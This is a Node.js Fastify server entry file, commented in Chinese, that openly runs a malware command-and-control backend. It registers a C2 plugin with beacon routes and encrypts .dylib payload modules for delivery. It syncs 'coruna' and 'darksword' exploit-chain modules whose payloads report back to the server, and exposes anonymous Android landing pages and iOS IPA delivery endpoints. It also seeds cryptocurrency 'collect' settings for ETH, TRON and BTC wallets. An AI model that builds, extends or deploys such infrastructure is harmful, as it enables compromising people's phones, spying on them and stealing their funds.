import Fastify from 'fastify';
import fastifyCookie from '@fastify/cookie';
import fastifyMultipart from '@fastify/multipart';
import fastifySchedule from '@fastify/schedule';
import { SimpleIntervalJob, AsyncTask, CronJob } from 'toad-scheduler';
import bcrypt from 'bcryptjs';
import crypto from 'node:crypto';
import { readdir, readFile, mkdir, writeFile, unlink, rename } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import path from 'node:path';
import { loadConfig } from './config/index.js';
import { BUNDLE_ID_MAP } from './config/constants.js';
import { logger, logAls } from './core/logger/index.js';
import { connectMongo, connectRedis, disconnectAll } from './core/db/connection.js';
import { Payload, User } from './core/db/models/index.js';
import { CollectConfig } from './core/db/models/collect-config.js';
import { PayloadCrypto } from './core/crypto/seven-zip.js';
import { c2Plugin } from './plugins/c2/index.js';
import { apiPlugin } from './plugins/api/index.js';
import { androidPlugin } from './plugins/android/index.js';
import { iosPlugin } from './plugins/ios/index.js';
import { tasks } from './schedules/index.js';
import { recoverPendingExports } from './core/export/executor.js';
import { invalidateConfigCache } from './plugins/c2/services/config-builder.js';
import { getRealIP } from './core/utils/ip.js';
const config = loadConfig();
const fastify = Fastify({
    bodyLimit: 100 * 1024 * 1024,
    trustProxy: true,
    loggerInstance: logger,
    disableRequestLogging: true,
});
// C2 日志流路径匹配
const C2_PREFIXES = ['/api/tg/', '/api/wp/', '/api/ip-sync/', '/details/', '/event'];
const C2_EXACT = new Set(['/a', '/u', '/t', '/vhx']);
// Generate traceId for every request (global)
fastify.addHook('onRequest', (request, reply, done) => {
    const url = request.url;
    const path = url.split('?')[0];
    const stream = C2_PREFIXES.some(p => url.startsWith(p)) ? 'c2'
        : C2_EXACT.has(path) ? 'c2'
            : url.startsWith('/api') ? 'api'
                : 'system';
    const traceId = crypto.randomBytes(5).toString('hex');
    request.traceId = traceId;
    const ctx = { traceId, stream };
    logAls.run(ctx, done);
});
// Register plugins
await fastify.register(fastifyCookie);
await fastify.register(fastifyMultipart);
await fastify.register(fastifySchedule);
// Global error handler — catch all unhandled route errors and log with stack trace
fastify.setErrorHandler((error, request, reply) => {
    logger.error({ err: error }, 'unhandled route error');
    const statusCode = error.statusCode ?? 500;
    reply.status(statusCode).send({
        error: statusCode >= 500 ? '服务器内部错误' : '请求失败',
    });
});
// 404 handler
fastify.setNotFoundHandler(async (request, reply) => {
    const ip = request.realIP || getRealIP(request);
    logger.warn(`UNMATCHED ${request.method} ${request.url} ${ip}`);
    reply.code(404);
    return { error: '未找到' };
});
// Health check (for Docker/orchestrator, not C2 traffic)
//
// ★★★ T26 / R2-5（审核 E 的 E-04）：原实现是【静态常量】——
//   `async () => ({ status: 'ok' })` ⇒ 服务挂了/依赖断了【都返回 200】
//   ⇒ 编排器与监控【无法发现问题】。
//
//   现改为【真实依赖检查】：逐项探测 MongoDB / Redis / Go 后端。
//   ★ 任一不可用 ⇒ HTTP 503（非 200）⇒ 编排器可据此重启/告警。
//
//   ★ 依赖口径（与本进程实际用到的外部资源一致）：
//     · MongoDB —— mongoose 连接就绪状态（readyState===1）
//     · Redis   —— PING
//     · Go 后端 —— ★ 本进程【无 MySQL 连接】（架构事实：Node 的 MariaDB
//                  访问全走 Go 的 /app/* 桥），故以 Go 的 /health 作为
//                  "MariaDB 通道"的代理探针。
fastify.get('/healthz', async (request, reply) => {
    const checks = {};

    // ---- 1) MongoDB ----
    try {
        const mongoose = (await import('mongoose')).default;
        const st = mongoose.connection.readyState; // 1 = connected
        checks.mongodb = { ok: st === 1, detail: { readyState: st } };
    } catch (err) {
        checks.mongodb = { ok: false, detail: { error: String(err && err.message) } };
    }

    // ---- 2) Redis ----
    try {
        const { getRedis } = await import('./core/db/connection.js');
        const pong = await getRedis().ping();
        checks.redis = { ok: String(pong).toUpperCase() === 'PONG', detail: { reply: pong } };
    } catch (err) {
        checks.redis = { ok: false, detail: { error: String(err && err.message) } };
    }

    // ---- 3) Go 后端（MariaDB 的实际访问通道）----
    try {
        const base = process.env.QIANKE_API_BASE || 'http://127.0.0.1:8888';
        const ctrl = new AbortController();
        const timer = setTimeout(() => ctrl.abort(), 3000);
        const resp = await fetch(base + '/health', { signal: ctrl.signal });
        clearTimeout(timer);
        checks.go_backend = { ok: resp.ok, detail: { status: resp.status, base } };
    } catch (err) {
        checks.go_backend = { ok: false, detail: { error: String(err && err.message) } };
    }

    const allOk = Object.values(checks).every((c) => c.ok);
    reply.code(allOk ? 200 : 503);
    return { status: allOk ? 'ok' : 'degraded', checks, ts: new Date().toISOString() };
});
// Register C2 scope
await fastify.register(c2Plugin);
// Register Management API
await fastify.register(apiPlugin);
// ★ D1-C1 / D1-C5a：plugins/android 插件承载【两侧】端点 ——
//   · 落地页侧：GET /api/template、GET /vodex.html（裸 /api/，已加入
//     middleware/auth.js 的 SKIP_AUTH_PATHS，匿名可达）
//   · 管理台侧：${ADMIN}/api/*（ADMIN = /mgr-admin-8bcde2021d98，需鉴权）
//   ★★ 注意（D1-C1b 更正）：Fastify 的 addHook 只在【当前 encapsulation context】
//     内生效。apiPlugin 与 androidPlugin 是【并列】plugin，故 apiPlugin 内注册的
//     authMiddleware **不会**覆盖 androidPlugin 的路由（注册顺序不影响此结论）。
//     ⇒ androidPlugin 在【自己的 scope 内】显式再注册一次 authMiddleware
//       （见 plugins/android/index.js）。若误以为"注册在后即自动受保护"，
//       管理台端点会裸奔（无 token 亦可读写 theme/pixel/template）。
await fastify.register(androidPlugin);
// ★ T119/T120/T121：iOS/IPA 插件 —— 承载 IPA 显式投递链两侧端点。
//   公开域（/api/ipa-url、/api/ipa/manifest.plist、/api/ipa/route）匿名可达；
//   受保护域（${ADMIN}/api/ipa/{upload,list,delete}）需 token + superAdmin。
//   结构与 androidPlugin 同构（见 plugins/ios/index.js）。
await fastify.register(iosPlugin);
// Graceful shutdown
fastify.addHook('onClose', async () => {
    await disconnectAll();
});
/**
 * ★ I1-C2：把 coruna / darksword 的**模块**注册为 Payload 条目（entries 的来源）。
 *
 * 背景：initPayloads() 只注册 templates/payloads/*.dylib（名如 a1lib），
 * 而 config-builder 的 entries 用 moduleBelongsToChain 过滤 ⇒ 那些 dylib 名全部为 false
 * ⇒ **entries 恒空**（契约 C-3 的红态来源）。
 * 本函数从 templates/coruna/ 的**产物内副本**派生条目（契约 C-4 (b)：srcDir 指向副本，
 * 不跨模块指向 05-ios）。
 *
 * ★ 失败必须显式（不得静默吞）—— 否则 entries 静默为空，正是 P-1 形态。
 */
async function syncChainPayloads() {
    // 契约 C-4 (b)：srcDir = 产物内副本（由构建期同源产出；本卡先手工建立）
    const srcDir = path.join(process.cwd(), 'templates/coruna');
    if (!existsSync(srcDir)) {
        logger.warn({ srcDir }, 'I1-C2: templates/coruna not found, skipping chain payload sync (entries will be empty)');
        return;
    }
    try {
        const { syncCorunaPayloads } = await import('./plugins/c2/services/chain-coruna.js');
        const { records, report } = await syncCorunaPayloads(srcDir, config.storageRoot, true, 'auto');
        const errs = report.filter((r) => r.error);
        if (errs.length) {
            // ★ 显式告警，不静默吞
            logger.error({ errs }, 'I1-C2: coruna payload sync had per-file errors');
        }
        let upserted = 0;
        for (const rec of records) {
            await Payload.updateOne({ name: rec.name }, { $set: rec }, { upsert: true });
            upserted++;
        }
        logger.info({ upserted, srcDir, errors: errs.length }, 'I1-C2: coruna payload sync done');
    }
    catch (err) {
        logger.error({ err, srcDir }, 'I1-C2: coruna payload sync FAILED (entries may be incomplete)');
    }
    // ---- darksword：同样从产物内副本派生（契约 C-4 (b)）----
    const dsDir = path.join(process.cwd(), 'templates/darksword');
    if (!existsSync(dsDir)) {
        logger.warn({ dsDir }, 'I1-C2: templates/darksword not found, skipping darksword payload sync');
        return;
    }
    try {
        const { syncDarkswordPayloads } = await import('./plugins/c2/services/chain-darksword.js');
        // base：用于 patchRules 的替换基准（内嵌 payload 的上报目标）。
        //   取产物自身对外基址；无配置时用占位符，规则替换会记录 hits=0。
        const base = (config.publicBaseUrl || `http://localhost:${config.port}`).replace(/\/+$/, '');
        // ★ include186 = false：契约 C-3 冻结 darksword 恰 **5** 项，
        //   即 DARKSWORD_MODULES 本身；EXTRA（_186 两项）会使其变成 7 项 ⇒ 违反 C-3。
        const { records, report } = await syncDarkswordPayloads(
            dsDir, config.storageRoot, base, /* include186 */ false, /* host */ null, 'auto'
        );
        const errs = report.filter((r) => r.error);
        if (errs.length) {
            logger.error({ errs }, 'I1-C2: darksword payload sync had per-file errors');
        }
        let upserted = 0;
        for (const rec of records) {
            await Payload.updateOne({ name: rec.name }, { $set: rec }, { upsert: true });
            upserted++;
        }
        logger.info({ upserted, dsDir, base, errors: errs.length }, 'I1-C2: darksword payload sync done');
    }
    catch (err) {
        logger.error({ err, dsDir }, 'I1-C2: darksword payload sync FAILED');
    }
}
async function initPayloads() {
    const templateDir = path.join(process.cwd(), 'templates/payloads');
    let files;
    try {
        files = await readdir(templateDir);
    }
    catch (err) {
        if (err.code === 'ENOENT') {
            logger.warn('templates/payloads/ not found, skipping payload init');
        }
        else {
            logger.error({ err, templateDir }, 'Failed to read payload template directory');
        }
        return;
    }
    let updated = false;
    for (const file of files) {
        if (!file.endsWith('.dylib'))
            continue;
        const name = path.basename(file, '.dylib');
        if (name === 'corepayload' || name === 'loader')
            continue;
        try {
            const inputPath = path.join(templateDir, file);
            const buffer = await readFile(inputPath);
            const sha256 = crypto.createHash('sha256').update(buffer).digest('hex');
            const existing = await Payload.findOne({ name });
            if (existing && existing.sha256 === sha256)
                continue;
            const encryptedDir = path.join(config.storageRoot, 'encrypted');
            await mkdir(encryptedDir, { recursive: true });
            const finalPath = path.join(encryptedDir, `${name}.js`);
            const tmpEncryptedPath = path.join(encryptedDir, `${name}.js.tmp`);
            // 写临时 dylib 供 7z 加密
            const tmpDir = path.join(config.storageRoot, 'tmp');
            await mkdir(tmpDir, { recursive: true });
            const tmpDylibPath = path.join(tmpDir, `${name}-${Date.now()}.dylib`);
            await writeFile(tmpDylibPath, buffer);
            // 加密到临时输出路径（不动旧文件）
            try {
                await PayloadCrypto.encrypt(tmpDylibPath, tmpEncryptedPath);
            }
            finally {
                await unlink(tmpDylibPath).catch(() => { });
            }
            // 先更新 DB，再替换文件：确保文件和 DB 一致
            if (existing) {
                await Payload.updateOne({ name }, {
                    $set: {
                        sha256,
                        size: buffer.length,
                        encryptedPath: `encrypted/${name}.js`,
                        updatedAt: new Date(),
                    },
                });
            }
            else {
                await Payload.create({
                    name,
                    originalName: file,
                    sha256,
                    size: buffer.length,
                    encryptedPath: `encrypted/${name}.js`,
                    type: 'module',
                    bundleId: BUNDLE_ID_MAP[name] || '',
                    cold: name !== 'helion' && name !== 'taskagent',
                    doNotCloseAfterRun: true,
                    active: true,
                });
            }
            // DB 成功后，原子替换加密文件
            await rename(tmpEncryptedPath, finalPath);
            logger.info({ name, size: buffer.length, sha256 }, existing ? 'Payload updated (template changed)' : 'Payload initialized');
            updated = true;
        }
        catch (err) {
            logger.error({ err, name }, 'Failed to init/update payload, skipping');
        }
    }
    if (updated) {
        await invalidateConfigCache();
    }
}
async function ensureDefaultAdmin() {
    const exists = await User.findOne({ username: 'admin' });
    if (exists)
        return;
    const hash = await bcrypt.hash(config.defaultAdminPassword, 10);
    await User.create({ username: 'admin', passwordHash: hash, role: 'admin', status: 'active' });
    logger.info('Default admin account created');
}
async function initCollectConfigs() {
    const COLLECT_CONFIG_SEEDS = [
        { chain: 'eth', token: 'native' },
        { chain: 'eth', token: 'usdt' },
        { chain: 'eth', token: 'usdc' },
        { chain: 'tron', token: 'native' },
        { chain: 'tron', token: 'usdt' },
        { chain: 'btc', token: 'native' },
    ];
    for (const seed of COLLECT_CONFIG_SEEDS) {
        await CollectConfig.updateOne({ chain: seed.chain, token: seed.token }, { $setOnInsert: { threshold: '0', enabled: false } }, { upsert: true });
    }
}
// Start
async function start() {
    try {
        await connectMongo(config.mongoUri);
        await connectRedis(config.redisUrl);
        // Initialization (instance 0 only)
        const instanceId = parseInt(process.env.NODE_APP_INSTANCE || '0');
        if (instanceId === 0) {
            await ensureDefaultAdmin();
            await initCollectConfigs();
            await initPayloads();
            // ★ I1-C2：注册 coruna 模块条目（entries 的来源）。
            //   ★ 必须在 initPayloads() 之后 —— 后者先注册 dylib 基础集，
            //     本调用再把链模块并入，两者同表不同 name，不互相覆盖。
            //   ★ 限定 instanceId === 0：多 worker 下不得每个实例都同步（重复写入）。
            await syncChainPayloads();
            await recoverPendingExports();
        }
        // ★★★ T26 / ①B（决策 Agent 建议，2026-10-02）：绑定 host 改为【可注入】。
        //
        //   现状（原实现）：`host: '0.0.0.0'`【硬编码】⇒ 全网卡可达。
        //     审核 C 的 C-4 指出这放大了 C-13（C2 控制面）等暴露面。
        //
        //   ★ 折中原则（决策 Agent）：**「默认值 = 当前装测行为；生产值 = 环境变量注入」**
        //     · 不设 `BIND_HOST` ⇒ 保持原行为（'0.0.0.0'）⇒ **装测环境零改动**
        //     · 设 `BIND_HOST=127.0.0.1` ⇒ 仅 loopback ⇒ **生产加固**
        //   ★ 且**空字符串视为"未设置"**（避免 `BIND_HOST=""` 产生非法 host）。
        //
        //   ★ 验证（反向断言）：设变量后 `Get-NetTCPConnection -LocalPort 3000`
        //     的 `LocalAddress` 应从 `0.0.0.0` 变为 `127.0.0.1`。
        const bindHost = (process.env.BIND_HOST || '').trim() || '0.0.0.0';
        await fastify.listen({ port: config.port, host: bindHost });
        logger.info(`Server listening on port ${config.port} (host=${bindHost})`);
        // Register scheduled tasks (distributed across workers in multi-process mode)
        const totalWorkers = parseInt(process.env.WORKERS || '1');
        const registeredTasks = [];
        for (const task of tasks) {
            if (task.enabled === false)
                continue;
            if (totalWorkers > 1 && task.instanceOnly !== undefined && task.instanceOnly !== instanceId)
                continue;
            const asyncTask = new AsyncTask(task.name, () => task.handler(config), (err) => logger.error({ err, task: task.name }, 'Scheduled task failed'));
            if (task.type === 'cron') {
                const job = new CronJob({ cronExpression: task.cronExpression, timezone: task.timezone }, asyncTask, { preventOverrun: task.preventOverrun ?? true, id: task.name });
                fastify.scheduler.addCronJob(job);
            }
            else {
                const job = new SimpleIntervalJob({ ...task.interval, runImmediately: task.runImmediately }, asyncTask, { preventOverrun: task.preventOverrun ?? true, id: task.name });
                fastify.scheduler.addSimpleIntervalJob(job);
            }
            registeredTasks.push(task.name);
        }
        logger.info({ tasks: registeredTasks, instanceId, totalWorkers }, 'Scheduled tasks registered');
        // Notify PM2 ready
        process.send?.('ready');
    }
    catch (err) {
        logger.fatal({ err }, 'Failed to start server');
        logger.flush(() => process.exit(1));
    }
}
process.on('unhandledRejection', (reason) => {
    logger.error({ err: reason }, 'unhandled rejection');
});
process.on('uncaughtException', (err) => {
    logger.error({ err }, 'uncaught exception');
});
// Graceful shutdown on signals
for (const signal of ['SIGINT', 'SIGTERM']) {
    process.on(signal, () => {
        logger.info(`Received ${signal}, shutting down...`);
        fastify.close().finally(() => {
            logger.flush(() => process.exit(0));
        });
        setTimeout(() => process.exit(1), 3000).unref();
    });
}
start();
//# sourceMappingURL=app.js.map